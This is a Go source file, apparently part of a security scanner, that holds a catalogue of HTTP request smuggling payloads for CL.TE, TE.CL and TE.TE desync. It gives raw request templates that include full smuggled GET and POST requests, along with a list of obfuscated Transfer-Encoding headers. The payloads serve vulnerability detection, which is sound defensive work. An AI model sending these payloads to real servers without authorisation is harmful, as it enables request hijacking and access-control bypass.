// Package smuggling provides HTTP Request Smuggling payloads for detecting
// CL.TE, TE.CL, and TE.TE vulnerabilities.
//
// HTTP Request Smuggling occurs when front-end and back-end servers
// interpret the boundary of HTTP requests differently, allowing attackers
// to "smuggle" malicious requests.
//
// References:
//   - https://portswigger.net/web-security/request-smuggling
//   - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
//   - CWE-444: Inconsistent Interpretation of HTTP Requests
//   - WSTG-INPV-15: Testing for HTTP Request Smuggling
package smuggling

// PayloadType represents the type of smuggling technique.
type PayloadType string

const (
	// PayloadCLTE represents Content-Length takes precedence over Transfer-Encoding.
	PayloadCLTE PayloadType = "CL.TE"
	// PayloadTECL represents Transfer-Encoding takes precedence over Content-Length.
	PayloadTECL PayloadType = "TE.CL"
	// PayloadTETE represents obfuscated Transfer-Encoding headers.
	PayloadTETE PayloadType = "TE.TE"
)

// Payload represents an HTTP Request Smuggling payload.
type Payload struct {
	// Type indicates the smuggling technique (CL.TE, TE.CL, TE.TE).
	Type PayloadType

	// Name is a short identifier for the payload.
	Name string

	// Description explains what this payload tests.
	Description string

	// RequestTemplate is the raw HTTP request template.
	// Use {{HOST}} placeholder for the target host.
	// Use {{PATH}} placeholder for the target path.
	// Use {{DELAY}} placeholder for timing delay in seconds.
	RequestTemplate string

	// ExpectedBehavior describes the expected vulnerable behavior.
	ExpectedBehavior string

	// DetectionMethod indicates how to detect vulnerability.
	DetectionMethod DetectionMethod
}

// DetectionMethod indicates how vulnerability is detected.
type DetectionMethod string

const (
	// DetectTiming uses response time differential.
	DetectTiming DetectionMethod = "timing"
	// DetectDifferential compares responses for differences.
	DetectDifferential DetectionMethod = "differential"
	// DetectSocket uses socket-level connection behavior.
	DetectSocket DetectionMethod = "socket"
)

// GetCLTEPayloads returns payloads for CL.TE (Content-Length wins, Transfer-Encoding ignored).
// In CL.TE, the front-end uses Content-Length and the back-end uses Transfer-Encoding.
func GetCLTEPayloads() []Payload {
	return cltePayloads
}

// GetTECLPayloads returns payloads for TE.CL (Transfer-Encoding wins, Content-Length ignored).
// In TE.CL, the front-end uses Transfer-Encoding and the back-end uses Content-Length.
func GetTECLPayloads() []Payload {
	return teclPayloads
}

// GetTETEPayloads returns payloads for TE.TE (obfuscated Transfer-Encoding).
// Both servers use Transfer-Encoding but one can be confused with obfuscation.
func GetTETEPayloads() []Payload {
	return tetePayloads
}

// GetTimingPayloads returns payloads designed for timing-based detection.
func GetTimingPayloads() []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.DetectionMethod == DetectTiming {
			result = append(result, p)
		}
	}
	return result
}

// GetAllPayloads returns all smuggling payloads.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, cltePayloads...)
	all = append(all, teclPayloads...)
	all = append(all, tetePayloads...)
	return all
}

// GetTEObfuscations returns Transfer-Encoding header obfuscation variants.
// These are used to confuse servers that parse headers differently.
func GetTEObfuscations() []string {
	return teObfuscations
}

// CL.TE Payloads - Frontend uses Content-Length, Backend uses Transfer-Encoding.
// The attack sends a request where CL is short, so frontend forwards partial
// body that backend interprets as a smuggled request via chunked encoding.
var cltePayloads = []Payload{
	{
		Type:        PayloadCLTE,
		Name:        "clte-basic-timing",
		Description: "Basic CL.TE timing detection with delayed chunk",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"1\r\n" +
			"G\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend waits for more chunks if vulnerable",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadCLTE,
		Name:        "clte-smuggle-get",
		Description: "CL.TE smuggle a GET request to cause 404",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 6\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n" +
			"G",
		ExpectedBehavior: "Next request gets prepended with 'G', causing error",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadCLTE,
		Name:        "clte-full-smuggle",
		Description: "CL.TE full request smuggling with complete GET",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 35\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n" +
			"GET /404test HTTP/1.1\r\n" +
			"Foo: x",
		ExpectedBehavior: "Backend processes smuggled GET /404test",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadCLTE,
		Name:        "clte-timeout-probe",
		Description: "CL.TE probe that causes backend timeout waiting for chunk",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 3\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"8\r\n" +
			"SMUGGLED\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend times out waiting for complete chunked body",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadCLTE,
		Name:        "clte-differential",
		Description: "CL.TE differential response probe",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 8\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"1\r\n" +
			"Z\r\n" +
			"Q",
		ExpectedBehavior: "Incomplete chunk causes backend to wait or error",
		DetectionMethod:  DetectTiming,
	},
}

// TE.CL Payloads - Frontend uses Transfer-Encoding, Backend uses Content-Length.
// The attack sends chunked data that ends with a smuggled request in what
// the backend considers part of the body based on Content-Length.
var teclPayloads = []Payload{
	{
		Type:        PayloadTECL,
		Name:        "tecl-basic-timing",
		Description: "Basic TE.CL timing detection",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"5c\r\n" +
			"GPOST / HTTP/1.1\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 15\r\n" +
			"\r\n" +
			"x=1\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend waits for content based on CL, causing timeout",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadTECL,
		Name:        "tecl-smuggle-post",
		Description: "TE.CL smuggle a POST request",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 3\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"8\r\n" +
			"SMUGGLED\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend reads only 3 bytes, leaving 'SMUGGLED' for next request",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTECL,
		Name:        "tecl-full-smuggle",
		Description: "TE.CL full request smuggling",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"73\r\n" +
			"POST /404test HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 10\r\n" +
			"\r\n" +
			"x=smuggled\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend processes smuggled POST request",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTECL,
		Name:        "tecl-timeout-probe",
		Description: "TE.CL probe using large Content-Length to cause timeout",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 6\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n" +
			"X",
		ExpectedBehavior: "Backend expects 6 bytes but receives terminator, causing wait",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadTECL,
		Name:        "tecl-gpost",
		Description: "TE.CL GPOST technique for response difference",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"29\r\n" +
			"GPOST / HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Next request becomes GPOST method causing 400/405",
		DetectionMethod:  DetectDifferential,
	},
}

// TE.TE Payloads - Both servers use Transfer-Encoding but with obfuscation.
// The attack uses malformed TE headers that one server ignores, falling back to CL.
var tetePayloads = []Payload{
	{
		Type:        PayloadTETE,
		Name:        "tete-space-before-colon",
		Description: "TE.TE with space before colon",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding : chunked\r\n" +
			"\r\n" +
			"5c\r\n" +
			"GPOST / HTTP/1.1\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 15\r\n" +
			"\r\n" +
			"x=1\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "One server rejects malformed header, uses CL instead",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-tab-header",
		Description: "TE.TE with tab character in header",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding:\tchunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Tab character may be handled differently",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-line-folding",
		Description: "TE.TE with obsolete line folding",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			" smuggle\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Line folding may be handled differently",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-xchunked",
		Description: "TE.TE with Transfer-Encoding: xchunked",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: xchunked\r\n" +
			"\r\n" +
			"test",
		ExpectedBehavior: "xchunked may be accepted or rejected differently",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-null-byte",
		Description: "TE.TE with null byte in value",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\x00ignore\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Null byte may truncate value for some parsers",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-double-te",
		Description: "TE.TE with duplicate Transfer-Encoding headers",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"Transfer-Encoding: identity\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Servers may use first or last TE header differently",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-mixed-case",
		Description: "TE.TE with mixed case encoding",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: ChUnKeD\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Mixed case may not be recognized",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-trailing-whitespace",
		Description: "TE.TE with trailing whitespace",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked \r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Trailing whitespace handling may differ",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-comma-separated",
		Description: "TE.TE with comma-separated encodings",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked, identity\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Comma handling may differ between servers",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-newline-prefix",
		Description: "TE.TE with newline prefix in value",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding:\n chunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Newline in value may cause parsing issues",
		DetectionMethod:  DetectDifferential,
	},
}

// Transfer-Encoding header obfuscation variants.
// These can be used to test how servers parse TE headers differently.
var teObfuscations = []string{
	// Standard variations
	"Transfer-Encoding: chunked",
	"transfer-encoding: chunked",
	"TRANSFER-ENCODING: chunked",
	"Transfer-encoding: chunked",

	// Whitespace variations
	"Transfer-Encoding : chunked",  // Space before colon
	"Transfer-Encoding:  chunked",  // Double space after colon
	"Transfer-Encoding:\tchunked",  // Tab after colon
	"Transfer-Encoding: chunked ",  // Trailing space
	"Transfer-Encoding:chunked",    // No space after colon
	" Transfer-Encoding: chunked",  // Leading space
	"Transfer-Encoding: chunked\t", // Trailing tab

	// Value variations
	"Transfer-Encoding: CHUNKED",      // Uppercase value
	"Transfer-Encoding: ChUnKeD",      // Mixed case value
	"Transfer-Encoding: chunked, cow", // Additional encoding
	"Transfer-Encoding: cow, chunked", // Chunked last
	"Transfer-Encoding: identity",     // Identity encoding

	// Invalid/Obfuscated values
	"Transfer-Encoding: xchunked",    // Invalid prefix
	"Transfer-Encoding: chunkedx",    // Invalid suffix
	"Transfer-Encoding: chunk\x00ed", // Null byte in value
	"Transfer-Encoding: [chunked]",   // Brackets
	"Transfer-Encoding: \"chunked\"", // Quoted

	// HTTP Request Smuggling specific
	"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity", // Double header
	"X-Transfer-Encoding: chunked",                              // Custom header
	"Transfer_Encoding: chunked",                                // Underscore
	"Transfer.Encoding: chunked",                                // Dot

	// Line continuation (obsolete but sometimes supported)
	"Transfer-Encoding: chunked\r\n ", // Obsolete line folding
}
